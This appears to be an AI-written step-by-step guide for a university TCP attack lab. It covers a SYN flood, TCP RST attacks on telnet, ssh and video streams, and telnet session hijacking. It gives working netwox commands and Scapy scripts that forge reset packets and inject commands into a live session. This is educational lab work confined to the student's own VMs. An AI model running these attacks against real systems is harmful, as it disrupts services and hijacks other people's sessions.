# COSC434/534 Lab 3: TCP Attack Lab Step-by-Step Guide

This guide is designed so you can run the full lab without missing steps. It starts with VM setup, then walks task-by-task with command templates, validation checks, and troubleshooting.

## 1. Lab Goal and Scope

You will complete these four tasks:

1. SYN Flooding attack (with SYN cookies ON and OFF)
2. TCP RST attack on telnet and ssh
3. TCP RST attack on video streaming over TCP
4. TCP session hijacking (telnet)

## 2. Before You Start

You need 3 Ubuntu SEED VMs on the same LAN:

- Attacker VM
- Server VM
- Client VM

Recommended: take snapshots after setup and before each major task.

## 3. VM Setup (Do This First)

## 3.1 VM Roles and IP Plan

Fill this table before continuing:

| Role | Hostname | Interface | IP | Notes |
|---|---|---|---|---|
| Attacker | `attacker` | e.g., `enp0s3` | `________________` | runs netwox/scapy |
| Server | `server` | e.g., `enp0s3` | `________________` | telnet/ssh target |
| Client | `client` | e.g., `enp0s3` | `________________` | initiates sessions |

All three must be on the same subnet (example: `192.168.56.0/24`).

## 3.2 Hypervisor Network Mode

Use one shared virtual network so all 3 VMs can directly talk to each other.

- VirtualBox: Host-Only Adapter or Internal Network (same network name for all VMs)
- VMware: Custom VMnet or Host-only (same VMnet for all VMs)

If you need internet for package install, add a second adapter as NAT.

## 3.3 Verify Interface and IP on Each VM

Run on each VM:

```bash
ip -br a
ip route
```

Record the active interface and IPv4 address in the table above.

## 3.4 Basic Connectivity Test

From each VM, ping the other two:

```bash
ping -c 2 <other-vm-ip>
```

Expected: 0% packet loss. If not, fix networking before continuing.

## 3.5 Install/Verify Tools on Each VM

Run these on all 3 VMs:

```bash
sudo apt update
sudo apt install -y net-tools tcpdump wireshark tshark telnet openssh-client openssh-server netcat
```

Run on attacker VM:

```bash
sudo apt install -y netwox python3-scapy
```

Quick verification:

```bash
which netwox
python3 -c "from scapy.all import IP, TCP; print('scapy ok')"
```

## 3.6 Start/Verify Services on Server VM

```bash
sudo systemctl enable --now ssh
sudo systemctl status ssh --no-pager
```

For telnet on Ubuntu SEED images, telnet server is typically via `openbsd-inetd`:

```bash
sudo apt install -y openbsd-inetd telnetd
sudo systemctl restart openbsd-inetd
sudo systemctl status openbsd-inetd --no-pager
```

Confirm listening ports on server VM:

```bash
sudo ss -ltnp | egrep ':23|:22'
```

Expected: ssh on `:22`, telnet on `:23`.

## 3.7 Disable Host Firewalls (If Needed for Lab)

If traffic appears blocked:

```bash
sudo ufw status
sudo ufw disable
```

Only disable in controlled lab VMs.

## 4. Baseline Packet Capture Setup (Attacker VM)

Find interface:

```bash
ip -br a
```

Start capture (replace `IFACE`):

```bash
sudo tcpdump -i IFACE -nn "tcp" 
```

You can run Wireshark instead if preferred.

Useful display/filter patterns:

- SYN flood: `tcp.flags.syn == 1 && tcp.flags.ack == 0`
- RST packets: `tcp.flags.reset == 1`
- Telnet traffic: `tcp.port == 23`
- SSH traffic: `tcp.port == 22`

## 5. Task 1: SYN Flooding Attack

## 5.1 Prepare Target Port on Server VM

Use any listening TCP service (ssh/telnet already work). You can also use a temporary listener:

```bash
nc -lv 9090
```

## 5.2 Check Queue and Baseline

On server VM:

```bash
sudo sysctl -q net.ipv4.tcp_max_syn_backlog
netstat -na | grep SYN_RECV
```

## 5.3 Run Attack from Attacker VM (Netwox Tool 76)

```bash
sudo netwox 76 -i <server-ip> -p <target-port>
```

Optional spoofing:

```bash
sudo netwox 76 -i <server-ip> -p <target-port> -s raw
```

## 5.4 Validate Success

On server VM while attack runs:

```bash
netstat -na | grep SYN_RECV
```

Signs of success:

- Large number of `SYN_RECV` entries
- Legitimate connection attempts become slow/fail

## 5.5 SYN Cookie Comparison (Required)

On server VM:

```bash
sudo sysctl -a | grep syncookies
sudo sysctl -w net.ipv4.tcp_syncookies=0
# run attack and observe
sudo sysctl -w net.ipv4.tcp_syncookies=1
# run attack again and observe
```

Document differences in queue behavior and service availability.

## 6. Task 2: TCP RST Attack on telnet and ssh

## 6.1 Create Legitimate Sessions

From client VM to server VM:

```bash
telnet <server-ip>
ssh <server-user>@<server-ip>
```

Keep at least one active session open.

## 6.2 Gather 4-Tuple + Sequence Context

On attacker VM capture traffic between client and server:

```bash
sudo tcpdump -i IFACE -nn "host <client-ip> and host <server-ip> and tcp"
```

Record:

- source IP / source port
- destination IP / destination port
- sequence and acknowledgment context from recent packets

## 6.3 Attack Using Netwox Tool 78

```bash
sudo netwox 78 -d IFACE -f "tcp and src host <client-ip> and dst host <server-ip>"
```

This resets matching TCP traffic. Use narrower filters per port when needed:

```bash
sudo netwox 78 -d IFACE -f "tcp and src host <client-ip> and dst host <server-ip> and dst port 23"
sudo netwox 78 -d IFACE -f "tcp and src host <client-ip> and dst host <server-ip> and dst port 22"
```

## 6.4 Attack Using Scapy (Required)

Create and run this on attacker VM after replacing fields:

```python
#!/usr/bin/env python3
from scapy.all import IP, TCP, send

ip = IP(src="<client-ip>", dst="<server-ip>")
tcp = TCP(
    sport=<client-src-port>,
    dport=<server-dst-port>,
    flags="R",
    seq=<valid-seq-number>,
    ack=<valid-ack-number>
)

pkt = ip/tcp
pkt.show()
send(pkt, verbose=0)
```

Expected result:

- telnet session typically drops quickly
- ssh session may reset too, but behavior can vary by timing and seq/ack correctness

## 7. Task 3: TCP RST Attack on Video Streaming

Important rule from your lab sheet: target only your victim machine, not third-party servers.

## 7.1 Start Video Session on Victim (Client VM)

Use a TCP-delivered video source (avoid YouTube due to QUIC/UDP). Example:

- https://samplelib.com/sample-mp4.html

## 7.2 Identify Active TCP Video Flow

On victim VM:

```bash
ss -tnp
```

Look for established connection(s) from browser process to remote content server over TCP.

## 7.3 Send RST Packets with Netwox 78

On attacker VM, target victim-directed traffic:

```bash
sudo netwox 78 -d IFACE -f "tcp and dst host <victim-ip>"
```

Then refine for specific stream flow if needed:

```bash
sudo netwox 78 -d IFACE -f "tcp and src host <video-server-ip> and dst host <victim-ip> and src port <video-server-port>"
```

Expected:

- stream stalls, buffers endlessly, or errors

Capture evidence with Wireshark/tcpdump showing RST packets.

## 8. Task 4: TCP Session Hijacking (telnet)

Goal: inject command into existing client-server telnet session.

## 8.1 Start Telnet Session

From client VM:

```bash
telnet <server-ip>
```

Keep this session open and interactive.

## 8.2 Collect Required Values

On attacker VM with capture:

- client IP and source port
- server IP and destination port (23)
- valid sequence number
- valid acknowledgment number
- current window size direction context

## 8.3 Inject with Netwox Tool 40

Convert command to hex first. Example command:

```bash
python3 - <<'PY'
cmd = "touch /tmp/tcp_hijack_success\n"
print(cmd.encode().hex())
PY
```

Then send spoofed TCP packet (replace placeholders):

```bash
sudo netwox 40 \
  -l <client-ip> \
  -m <server-ip> \
  -j <ttl> \
  -o <client-src-port> \
  -p 23 \
  -q <seq-num> \
  -E <window-size> \
  -r <ack-num> \
  -z \
  -H <hex-command-data>
```

Notes:

- Include newline in command (`\n` or `\r\n`) so telnet executes it.
- Wrong seq/ack is the most common failure.

## 8.4 Inject with Scapy (Required)

```python
#!/usr/bin/env python3
from scapy.all import IP, TCP, send

ip = IP(src="<client-ip>", dst="<server-ip>")
tcp = TCP(
    sport=<client-src-port>,
    dport=23,
    flags="A",
    seq=<seq-num>,
    ack=<ack-num>
)
data = "touch /tmp/tcp_hijack_scapy\n"

pkt = ip/tcp/data
pkt.show()
send(pkt, verbose=0)
```

Verify on server VM:

```bash
ls -l /tmp/tcp_hijack_success /tmp/tcp_hijack_scapy
```

## 9. Evidence Checklist (For Report)

For full credit, capture screenshots/logs for each item:

- VM IP table and connectivity checks
- Task 1: pre/post `SYN_RECV`, cookie OFF vs ON comparison
- Task 2: active telnet/ssh session and reset impact (Netwox + Scapy)
- Task 3: video stream disrupted and RST capture evidence
- Task 4: packet crafting values, injected command evidence, file created on server
- Key code snippets plus your explanation of each

## 10. Troubleshooting Quick Reference

## 10.1 No traffic visible on attacker

- Check all VMs are truly on same virtual LAN.
- Confirm correct interface in tcpdump/netwox (`ip -br a`).
- If using macOS + UTM limitations, run attacker code on same VM as target per lab note.

## 10.2 `apt update` DNS failures

- Verify internet adapter/NAT exists.
- Temporarily set DNS:

```bash
sudo bash -c 'echo "nameserver 8.8.8.8" > /etc/resolv.conf'
```

- Retry package install.

## 10.3 SYN flood seems ineffective

- Turn syncookies OFF and retest.
- Increase attack duration.
- Ensure target port is listening.

## 10.4 RST attack not dropping session

- Sequence/ACK likely wrong (Scapy mode).
- Send multiple RSTs near current sequence window.
- Confirm you used correct flow direction (client->server or server->client).

## 10.5 Telnet hijack command not executing

- Include command terminator (`\n` or `\r\n`).
- Re-check seq/ack and window values.
- Try a harmless simple command first: `id\n` then `touch ...`.

## 10.6 SSH reset inconsistent

- SSH can recover depending on timing/retransmission.
- Trigger during active data transfer for better effect.

## 11. Suggested Execution Order (Do Not Skip)

1. VM setup and connectivity
2. Tool verification
3. Task 1 with cookies OFF, then ON
4. Task 2 telnet then ssh (Netwox then Scapy)
5. Task 3 video stream reset
6. Task 4 telnet hijack (Netwox then Scapy)
7. Organize screenshots and notes immediately after each task

## 12. Lab Log Template (Copy Into Your Notes)

```text
Date/Time:
VM IPs:
Task:
Command(s) run:
Observation:
Expected vs actual:
Troubleshooting attempted:
Final result:
Screenshot filename(s):
```

---

If you want, we can now execute this live one step at a time starting at Section 3.1 (assigning your exact IP plan), and I will not move forward until each checkpoint passes.
